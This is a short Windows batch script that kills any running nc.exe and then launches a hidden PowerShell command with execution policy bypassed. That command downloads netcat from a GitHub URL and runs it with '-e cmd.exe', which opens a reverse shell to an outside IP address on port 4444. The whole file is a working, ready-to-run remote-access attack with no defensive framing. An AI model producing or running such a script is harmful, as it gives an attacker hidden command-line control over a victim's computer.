
@echo off

REM Check if nc.exe is running and terminate it if found
tasklist /FI "IMAGENAME eq nc.exe" | find /I "nc.exe" >nul
if not errorlevel 1 (
    echo nc.exe is running. Terminating the process...
    taskkill /F /IM nc.exe
    echo nc.exe has been terminated.
) else (
    echo nc.exe is not running.
)

REM Start the reverse shell using nc.exe
powershell -w hidden -NoP -NonI -Exec Bypass -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/int0x33/nc.exe/raw/master/nc.exe','C:\Temp\nc.exe');Start-Process 'C:\Temp\nc.exe' -ArgumentList '193.114.96.29 4444 -e cmd.exe' -WindowStyle Hidden"
